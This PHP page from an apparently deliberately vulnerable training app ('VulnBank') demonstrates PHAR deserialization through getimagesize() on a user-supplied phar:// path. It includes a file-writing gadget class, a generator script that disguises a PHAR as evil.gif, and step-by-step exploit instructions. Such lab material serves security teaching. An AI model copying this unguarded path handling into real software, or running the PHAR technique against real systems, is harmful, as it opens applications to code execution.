<?php
// ============================================================
//  VulnBank – Avatar Image Validator
//  CWE-502: PHAR Deserialization via filesystem functions
//
//  A "gadget" class (FileLogger) exists in this codebase.
//  When any filesystem function (getimagesize, file_exists, fopen)
//  is called with a phar:// path, PHP automatically deserializes
//  the PHAR metadata — calling __destruct() on stored objects.
//
//  There is NO explicit unserialize() call in this file.
//  That's what makes PHAR deserialization hard for SAST to detect.
//
//  Steps to exploit:
//  1. Run generate_phar.php (CLI) to create evil.gif
//  2. Upload evil.gif via upload.php
//  3. Visit this page with ?check=phar://uploads/evil.gif
//  4. getimagesize() deserializes PHAR metadata → __destruct() fires
//  5. FileLogger writes to uploads/pwned.txt
// ============================================================
require_once 'db.php';
require '_header.php';
if (!isset($_SESSION['user_id'])) { header('Location: index.php'); exit; }

// ── GADGET CLASS ─────────────────────────────────────────────
// __destruct() called automatically on garbage collection after
// PHAR metadata deserialization — even without unserialize() in code
class FileLogger {
    public string $filename = '/tmp/vuln.log';
    public string $data     = '';

    public function __destruct() {
        // This runs when the object is GC'd after PHAR deserialization
        if ($this->filename && $this->data) {
            file_put_contents($this->filename, "[" . date('Y-m-d H:i:s') . "] " . $this->data . "\n", FILE_APPEND);
        }
    }
}

$output = $error = $img_info = '';

// Path supplied by user — can be phar://uploads/evil.gif
$path = $_GET['check'] ?? '';

if ($path) {
    // CWE-502: PHAR DESERIALIZATION
    // If $path = "phar://uploads/evil.gif", getimagesize() opens the PHAR,
    // deserializes its metadata (a serialized FileLogger object), and when
    // that object is garbage collected, __destruct() fires.
    //
    // No unserialize() here — the vulnerability is implicit.
    try {
        $info = @getimagesize($path);  // ← PHAR deserialization trigger
        if ($info) {
            $img_info = "Width: {$info[0]}px, Height: {$info[1]}px, Type: {$info['mime']}";
            $output   = '✅ Valid image: ' . $img_info;
        } else {
            // A05: expose the path in error
            $error = "Not a valid image: " . htmlspecialchars($path);
        }
    } catch (Throwable $e) {
        $error = 'Error: ' . $e->getMessage();
    }

    // Check if exploitation succeeded
    if (file_exists(__DIR__ . '/uploads/pwned.txt')) {
        $pwned = file_get_contents(__DIR__ . '/uploads/pwned.txt');
        $output .= '<div class="alert alert-danger mt-2">💥 PHAR deserialization executed! Contents of uploads/pwned.txt:<br><pre>' .
                   htmlspecialchars($pwned) . '</pre></div>';
    }
}

// List available uploads for convenience
$uploads = glob(__DIR__ . '/uploads/*') ?: [];
?>

<div class="row justify-content-center">
  <div class="col-md-8">
    <div class="alert-vuln">
      ⚠️ <span class="badge-vuln">CWE-502 PHAR Deserialization</span> — <code>getimagesize()</code> with user-supplied path triggers deserialization with NO <code>unserialize()</code> in source
    </div>

    <div class="card shadow mb-3">
      <div class="card-header">Avatar Image Validator</div>
      <div class="card-body">
        <?php if ($error):  ?><div class="alert alert-warning"><?= $error ?></div><?php endif; ?>
        <?php if ($output): ?><div class="alert alert-info"><?= $output ?></div><?php endif; ?>

        <div class="input-group mb-3">
          <input type="text" id="imgpath" class="form-control"
                 value="<?= htmlspecialchars($path) ?>"
                 placeholder="e.g. uploads/photo.jpg  or  phar://uploads/evil.gif">
          <button class="btn btn-primary"
                  onclick="location.href='phar.php?check='+encodeURIComponent(document.getElementById('imgpath').value)">
            Validate Image
          </button>
        </div>

        <?php if ($uploads): ?>
        <p class="text-muted mb-1" style="font-size:.85rem">Files in uploads/:</p>
        <div class="d-flex flex-wrap gap-1" style="gap:6px">
          <?php foreach ($uploads as $f): ?>
          <a href="phar.php?check=phar://uploads/<?= urlencode(basename($f)) ?>"
             class="btn btn-xs btn-outline-danger btn-sm" style="font-size:.75rem">
            phar://uploads/<?= htmlspecialchars(basename($f)) ?>
          </a>
          <?php endforeach; ?>
        </div>
        <?php endif; ?>
      </div>
    </div>

    <div class="card shadow">
      <div class="card-header">Exploit Steps</div>
      <div class="card-body" style="font-size:.82rem">
        <strong>Step 1: Create the PHAR gadget (save as generate_phar.php, run with PHP CLI):</strong>
        <pre class="bg-dark text-light p-2 rounded mt-1 mb-3" style="font-size:.75rem"><?= htmlspecialchars('<?php
// Run: php -d phar.readonly=0 generate_phar.php
class FileLogger {
    public string $filename;
    public string $data;
    public function __destruct() {
        file_put_contents($this->filename, $this->data . "\n", FILE_APPEND);
    }
}
$gadget = new FileLogger();
$gadget->filename = __DIR__ . \'/vuln-bank/uploads/pwned.txt\';
$gadget->data = \'PHAR deserialization via getimagesize() — no unserialize() in source!\';

$phar = new Phar(\'evil.phar\');
$phar->startBuffering();
$phar->addFromString(\'test.txt\', \'test\');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($gadget);   // ← serialize gadget into PHAR metadata
$phar->stopBuffering();
rename(\'evil.phar\', \'evil.gif\');  // disguise as image
echo "evil.gif created\n";') ?></pre>

        <strong>Step 2:</strong> Upload <code>evil.gif</code> via <a href="upload.php">upload.php</a><br>
        <strong>Step 3:</strong> Click the <code>phar://uploads/evil.gif</code> button above<br>
        <strong>Step 4:</strong> <code>getimagesize("phar://uploads/evil.gif")</code> deserializes metadata<br>
        <strong>Step 5:</strong> <code>FileLogger::__destruct()</code> fires, writes <code>uploads/pwned.txt</code><br><br>

        <strong>Why SAST misses this:</strong> There is no <code>unserialize()</code> call in this file.
        The deserialization is triggered implicitly by <code>getimagesize()</code> when given a <code>phar://</code>
        path. A scanner must know that <em>any</em> filesystem function on a user-controlled path is a potential
        PHAR deserialization sink.
      </div>
    </div>
  </div>
</div>

<?php require '_footer.php'; ?>
